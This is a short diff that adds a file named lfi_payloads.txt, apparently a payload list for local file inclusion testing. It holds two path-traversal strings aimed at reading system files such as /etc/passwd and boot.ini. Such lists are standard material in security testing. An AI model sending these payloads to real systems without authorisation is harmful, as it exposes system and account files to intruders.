@@ -1,0 +1,3 @@
+# lfi_payloads.txt
+../../etc/passwd
+../boot.ini
